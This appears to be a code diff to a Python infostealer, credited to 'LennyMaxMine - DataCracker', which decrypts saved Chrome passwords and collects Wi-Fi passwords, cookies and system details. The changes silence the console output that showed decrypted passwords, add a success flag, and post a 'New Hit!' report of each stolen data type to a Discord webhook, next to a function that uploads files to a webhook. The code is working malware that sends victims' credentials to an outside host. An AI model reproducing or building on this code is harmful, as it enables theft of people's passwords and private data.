@@ -259,7 +259,7 @@ def write_passwords_to_txt(passwords, filename):
                 txt_file.write(f"User Name: {password['username']}\n")
                 txt_file.write(f"Password: {password['password']}\n")
                 txt_file.write("*" * 50 + "\n")
-        print(f"Die Passwörter wurden in die Datei '{filename}' geschrieben.")
+        # print(f"Die Passwörter wurden in die Datei '{filename}' geschrieben.")
     except Exception as e:
         print(f"Fehler beim Schreiben der Passwörter in die Datei: {str(e)}")
 
@@ -307,10 +307,10 @@ try:
                     # (4) Use AES algorithm to decrypt the password
                     decrypted_password = decrypt_password(
                         ciphertext, secret_key)
-                    print("Sequence: %d" % (index))
-                    print("URL: %s\nUser Name: %s\nPassword: %s\n" %
-                          (url, username, decrypted_password))
-                    print("*"*50)
+                    # print("Sequence: %d" % (index))
+                    # print("URL: %s\nUser Name: %s\nPassword: %s\n" %
+                    #      (url, username, decrypted_password))
+                    # print("*"*50)
                     # (5) Speichern in der Liste 'passwords'
                     passwords.append({
                         "index": index,
@@ -321,9 +321,11 @@ try:
 
     # Schreibe die Passwörter in eine Textdatei
     write_passwords_to_txt(passwords, 'passwords.txt')
+    gotpw = True
 
 except Exception as e:
     print("[ERR] %s" % str(e))
+    gotpw = False
 
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------
@@ -442,6 +444,68 @@ except:
 #        f.write("Username: {:<34} | Roblox Profile: {:<10} | Age: {:5} | Robux: {:6} | Premium: {:7}\n".format(
 #            username, roblox_profile, age, robux, premium))
 #        f.write("Cookies\n")
+
+try:
+    webhook_data = {
+        "content": "@everyone",
+        "color": 6749952,
+        "embeds": [
+            {
+                "title": "New Hit!",
+                "color": None,
+                "fields": [
+                    {
+                        "name": "Got Wifi Profiles",
+                        "value": gotprofile1,
+                        "inline": True
+                    },
+                    {
+                        "name": "Got Wifi Profiles Passwords",
+                        "value": gotprofiledata,
+                        "inline": True
+                    },
+                    {
+                        "name": "Got IP-Address Infos",
+                        "value": gotipinfo,
+                        "inline": True
+                    },
+                    {
+                        "name": "Asked for Cookies",
+                        "value": askedforcookies,
+                        "inline": True
+                    },
+                    {
+                        "name": "Got System Infos",
+                        "value": gotsysteminfo,
+                        "inline": True
+                    },
+                    {
+                        "name": "Got Chrome Passwords",
+                        "value": gotpw,
+                        "inline": True
+                    }
+                ],
+                "author": {
+                    "name": "By LennyMaxMine - DataCracker"
+                },
+                "footer": {
+                    "text": "On: " + formatted_time
+                }
+            },
+        ],
+        "attachments": []
+    }
+
+    # Konvertiere JSON-Daten in einen String
+    webhook_json = json.dumps(webhook_data)
+
+    # Sende den POST-Request an den Webhook
+    response = requests.post(wurl, data=webhook_json, headers={
+                             'Content-Type': 'application/json'})
+
+except Exception as e:
+    print("Fehler beim Ausführen des Codes (Webhook):", str(e))
+
 
 try:
     def send_file_to_discord_webhook(webhook_url, file_path):
